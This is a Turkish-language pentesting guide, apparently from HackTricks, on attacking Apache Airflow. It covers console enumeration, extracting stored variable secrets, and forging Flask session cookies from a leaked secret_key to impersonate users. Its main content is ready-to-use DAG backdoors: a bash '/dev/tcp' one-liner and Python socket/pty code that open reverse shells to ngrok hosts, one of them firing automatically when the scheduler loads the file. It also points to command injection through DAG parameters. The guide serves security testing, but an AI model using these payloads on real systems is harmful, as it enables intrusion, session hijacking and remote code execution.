# Apache Airflow Güvenliği

{{#include ../../banners/hacktricks-training.md}}

### Temel Bilgiler

[**Apache Airflow**](https://airflow.apache.org), **veri boru hatlarını veya iş akışlarını düzenlemek ve zamanlamak için bir platform** olarak hizmet eder. Veri boru hatları bağlamında "orchestrasyon" terimi, çeşitli kaynaklardan gelen karmaşık veri iş akışlarını düzenleme, koordine etme ve yönetme sürecini ifade eder. Bu düzenlenmiş veri boru hatlarının temel amacı, işlenmiş ve tüketilebilir veri setleri sağlamaktır. Bu veri setleri, iş zekası araçları, veri bilimi ve makine öğrenimi modelleri gibi çok sayıda uygulama tarafından yaygın olarak kullanılmaktadır; bunların hepsi büyük veri uygulamalarının işleyişi için temeldir.

Temelde, Apache Airflow, **bir şey olduğunda kodun çalıştırılmasını zamanlamanıza olanak tanır** (olay, cron).

### Yerel Laboratuvar

#### Docker-Compose

Tam bir apache airflow docker ortamı başlatmak için **docker-compose yapılandırma dosyasını** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) adresinden kullanabilirsiniz. (Eğer MacOS kullanıyorsanız, docker VM'ye en az 6GB RAM vermeyi unutmayın).

#### Minikube

**Apache Airflow'u çalıştırmanın** kolay bir yolu, **minikube ile çalıştırmaktır**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Airflow Yapılandırması

Airflow, yapılandırmasında **hassas bilgileri** saklayabilir veya zayıf yapılandırmalar bulabilirsiniz:

{{#ref}}
airflow-configuration.md
{{#endref}}

### Airflow RBAC

Airflow'a saldırmaya başlamadan önce **izinlerin nasıl çalıştığını** anlamalısınız:

{{#ref}}
airflow-rbac.md
{{#endref}}

### Saldırılar

#### Web Konsolu Sayım

Eğer **web konsoluna erişiminiz** varsa, aşağıdaki bilgilerden bazılarına veya hepsine erişim sağlayabilirsiniz:

- **Değişkenler** (Özel hassas bilgiler burada saklanabilir)
- **Bağlantılar** (Özel hassas bilgiler burada saklanabilir)
- `http://<airflow>/connection/list/` adresinden erişin
- [**Yapılandırma**](./#airflow-configuration) (Hassas bilgiler, örneğin **`secret_key`** ve şifreler burada saklanabilir)
- **kullanıcılar ve roller** listesini görüntüleyin
- **Her DAG'ın kodu** (ilginç bilgiler içerebilir)

#### Değişken Değerlerini Alma

Değişkenler Airflow'da saklanabilir, böylece **DAG'lar** değerlerine **erişebilir**. Bu, diğer platformların gizli bilgilerine benzer. Eğer **yeterli izinleriniz** varsa, bunlara `http://<airflow>/variable/list/` adresinde GUI üzerinden erişebilirsiniz.\
Airflow varsayılan olarak değişkenin değerini GUI'de gösterir, ancak [**şuna**](https://marclamberti.com/blog/variables-with-apache-airflow/) göre, **değerinin** **yıldızlar** olarak görüneceği **değişkenler listesi** ayarlamak mümkündür.

![](<../../images/image (164).png>)

Ancak, bu **değerler** hala **CLI** üzerinden (DB erişiminiz olmalı), **rastgele DAG** çalıştırarak, **API** ile değişkenler uç noktasına erişerek (API'nin etkinleştirilmesi gerekir) ve **hatta GUI'nin kendisi aracılığıyla** **alınabilir!**\
Bu değerleri GUI'den erişmek için sadece **erişmek istediğiniz değişkenleri** seçin ve **Eylemler -> Dışa Aktar** seçeneğine tıklayın.\
Başka bir yol, **gizli değere** ulaşmak için **arama filtrelemesi** kullanarak **bruteforce** yapmaktır:

![](<../../images/image (152).png>)

#### Yetki Yükseltme

Eğer **`expose_config`** yapılandırması **True** olarak ayarlandıysa, **Kullanıcı** rolünden ve **üstündeki** roller **web'deki yapılandırmayı okuyabilir**. Bu yapılandırmada, **`secret_key`** görünür, bu da bu geçerli anahtara sahip herhangi bir kullanıcının **kendi imzalı çerezini oluşturup başka bir kullanıcı hesabını taklit edebileceği** anlamına gelir.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG Arka Kapı (Airflow işçi içinde RCE)

Eğer **DAG'ların kaydedildiği** yere **yazma erişiminiz** varsa, sadece **bir tane oluşturabilirsiniz** ve bu size bir **ters kabuk** gönderecektir.\
Bu ters kabuğun bir **airflow işçi konteyneri** içinde çalıştırılacağını unutmayın:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG Arka Kapı (Airflow zamanlayıcısında RCE)

Eğer bir şeyi **kodun kökünde çalıştırılacak şekilde ayarlarsanız**, bu yazının yazıldığı anda, **zamanlayıcı tarafından** DAG klasörüne yerleştirildikten birkaç saniye sonra **çalıştırılacaktır**.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### DAG Oluşturma

Eğer **DAG kümesindeki bir makineyi ele geçirirseniz**, `dags/` klasöründe yeni **DAG scriptleri** oluşturabilirsiniz ve bunlar **DAG kümesindeki diğer makinelere kopyalanacaktır.**

#### DAG Kod Enjeksiyonu

GUI'den bir DAG çalıştırdığınızda ona **argümanlar** geçirebilirsiniz.\
Bu nedenle, eğer DAG düzgün kodlanmamışsa **Komut Enjeksiyonuna karşı savunmasız** olabilir.\
Bu, bu CVE'de olan bir durumdur: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

**DAG'lerde komut enjeksiyonları aramaya başlamak için bilmeniz gereken tek şey**, **parametrelerin** **`dag_run.conf.get("param_name")`** kodu ile **erişildiğidir.**

Ayrıca, aynı zafiyet **değişkenlerle** de meydana gelebilir (yeterli ayrıcalıklara sahip olduğunuzda GUI'de **değişkenlerin değerini kontrol edebilirsiniz**). Değişkenler **şu şekilde erişilir**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Eğer örneğin bir bash komutunun içinde kullanılırlarsa, bir komut enjeksiyonu gerçekleştirebilirsiniz.

{{#include ../../banners/hacktricks-training.md}}
